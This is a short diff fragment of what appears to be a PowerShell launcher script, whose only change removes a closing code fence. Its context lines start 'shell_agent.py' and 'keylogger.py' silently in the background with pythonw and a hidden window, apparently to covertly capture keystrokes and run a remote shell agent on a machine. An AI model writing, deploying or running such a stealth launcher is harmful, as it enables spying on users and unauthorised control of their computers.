@@ -31,4 +31,4 @@ Start-Process pythonw -ArgumentList "$dir\shell_agent.py" -WindowStyle Hidden
 
 # Launch keylogger.py silently in background
 Start-Process pythonw -ArgumentList "$dir\keylogger.py" -WindowStyle Hidden
-```
+
